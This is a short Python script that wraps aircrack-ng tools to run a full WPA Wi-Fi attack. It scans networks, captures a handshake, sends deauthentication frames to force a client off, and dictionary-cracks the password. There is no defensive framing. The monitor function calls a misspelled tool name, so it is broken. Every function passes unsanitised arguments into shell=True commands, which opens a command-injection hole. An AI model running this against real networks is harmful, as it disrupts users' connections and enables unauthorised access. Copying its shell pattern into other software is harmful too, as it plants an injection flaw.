import subprocess  # Module used to execute system commands

def monitor(wifi_cards):
    subprocess.run(f"sudo airmodump-ng {wifi_cards}", shell=True)
  
def scan(wifi_cards):
    subprocess.run(f"sudo airodump-ng {wifi_cards}", shell=True)

def handshake(channel,macAddress, wirlessCard):
    subprocess.run(f"sudo airodump-ng -c {channel} --bssid {macAddress} -w psk {wirlessCard}", shell=True)

def deathauth(numberDeauths, acessPoint, client, wirlessCard):
    subprocess.run(f"sudo aireplay-ng -0 {numberDeauths} -a {acessPoint} -c {client} {wirlessCard}", shell=True)
    
def crack(dictionary, macAdresse):
    subprocess.run(f"aircrack-ng -w {dictionary} -b {macAdresse} psk*.cap", shell=True)
    
